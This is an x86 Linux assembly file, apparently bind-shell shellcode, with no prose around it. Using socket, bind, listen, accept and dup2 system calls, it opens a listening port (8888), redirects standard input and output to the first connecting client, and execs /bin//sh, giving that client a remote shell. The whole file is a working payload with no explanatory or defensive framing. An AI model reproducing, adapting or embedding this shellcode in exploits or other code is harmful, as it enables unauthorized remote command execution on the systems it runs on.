global	_start

section	.text

_start:

; SYS_SOCKET
push 0x66
pop eax	 
cdq
push ebx
inc ebx
push ebx
push 0x2
mov ecx,esp
int 0x80

; SYS_BIND
pop ebx
pop esi
push edx
push word 0xb822
push edx
push byte 0x02
push 0x10
push ecx
push eax
mov ecx,esp
mov al,0x66
int 0x80

; SYS_LISTEN
pop edx
pop eax
xor eax,eax
push eax
push edx
cdq
mov bl,0x4
mov al,0x66
int 0x80

; SYS_ACCEPT
inc ebx
mov al,0x66
int 0x80

; DUP2
xchg eax, ebx
pop ecx
loop:
	mov al,63
	int 0x80
	dec ecx
	jns loop
done:
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	mov ecx,esp
	mov al,0xb	; EXECVE CALL
	int 0x80
